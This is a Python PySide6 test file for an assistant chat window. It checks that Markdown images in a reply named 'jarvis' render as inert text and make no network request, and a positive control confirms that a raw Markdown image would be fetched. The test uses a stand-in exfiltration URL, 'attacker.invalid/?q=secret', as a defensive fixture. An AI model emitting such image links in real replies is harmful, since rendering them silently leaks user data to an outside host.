"""SECEXFIL: a reply's Markdown image is shown as inert text, never fetched.

The real window renders the reply offscreen while a network access manager
factory on its engine records every request QML would make. The recorder
answers each one from an empty data: URL, so nothing reaches the network even
when a request is made (the positive control proves the recorder sees one).
"""

from __future__ import annotations

import threading
from unittest import mock

import tests.test_ui as ui
from PySide6 import QtQml
from PySide6.QtCore import Q_ARG, Q_RETURN_ARG, QMetaObject, QUrl
from PySide6.QtNetwork import QNetworkAccessManager, QNetworkRequest

SECRET = "https://attacker.invalid/?q=secret"


class Recorder(QtQml.QQmlNetworkAccessManagerFactory):
    def __init__(self) -> None:
        super().__init__()
        self.urls: list[str] = []
        self.lock = threading.Lock()

    def create(self, parent):
        recorder = self

        class Recording(QNetworkAccessManager):
            def createRequest(self, op, request, data=None):
                with recorder.lock:
                    recorder.urls.append(request.url().toString())
                return super().createRequest(op, QNetworkRequest(QUrl("data:,")), data)
        return Recording(parent)


class FeedNoRemoteImageTests(ui.UiTestCase):
    def setUp(self) -> None:
        super().setUp()
        self.recorder = Recorder()
        recorder, base = self.recorder, QtQml.QQmlApplicationEngine

        class Engine(base):
            def __init__(self, *args) -> None:
                super().__init__(*args)
                self.setNetworkAccessManagerFactory(recorder)
        patched = mock.patch.object(QtQml, "QQmlApplicationEngine", Engine)
        patched.start()
        self.addCleanup(patched.stop)

    def window(self, bridge):
        root = self.load(bridge)
        root.showNormal()
        root.resize(1280, 900)
        ui.window_ready(self, root, 1280, 900, 350)
        return root

    def shown(self, root, needle):
        """The reply as the reader sees it: read from the document, not its Markdown."""
        found, stack = [], [root.contentItem()]
        while stack:
            node = stack.pop()
            stack.extend(node.childItems())
            if node.objectName() == "feedMessage_jarvis" and node.isVisible():
                text = QMetaObject.invokeMethod(node, "getText", Q_RETURN_ARG(str), Q_ARG(int, 0), Q_ARG(int, 100000))
                found.append(str(text).replace(" ", "\n").replace(" ", "\n"))
        return next((t for t in found if needle in t), "\n".join(found))

    def test_a_reply_image_renders_as_text_and_makes_no_request(self) -> None:
        bridge = self.bridge()
        root = self.window(bridge)
        bridge._say("jarvis", f"önce ![x]({SECRET}) sonra ![y][ref]\n\n[ref]: {SECRET}&r=1\n\n"
                              f"```\n![kod]({SECRET})\n```", chat=True)
        ui.pump(600)
        self.assertEqual([], [u for u in self.recorder.urls if "attacker" in u])
        shown = self.shown(root, "önce")
        self.assertIn("[image: x]", shown)
        self.assertIn("[image: y]", shown)
        self.assertIn(f"![kod]({SECRET})", shown)          # a fenced code block stays as written

        # Positive control: the same engine, the raw Markdown image - the recorder sees the fetch.
        probe = QtQml.QQmlComponent(self.engine)
        probe.setData(b'import QtQuick\nTextEdit { textFormat: TextEdit.MarkdownText }', QUrl())
        edit = probe.create()
        edit.setParent(root)                                 # the window owns it and ends it
        edit.setParentItem(root.contentItem())
        edit.setProperty("text", f"![x]({SECRET})")
        ui.wait_until(lambda: any("attacker" in u for u in self.recorder.urls), 2000)
        self.assertIn(SECRET, self.recorder.urls)


if __name__ == "__main__":
    import unittest
    unittest.main()
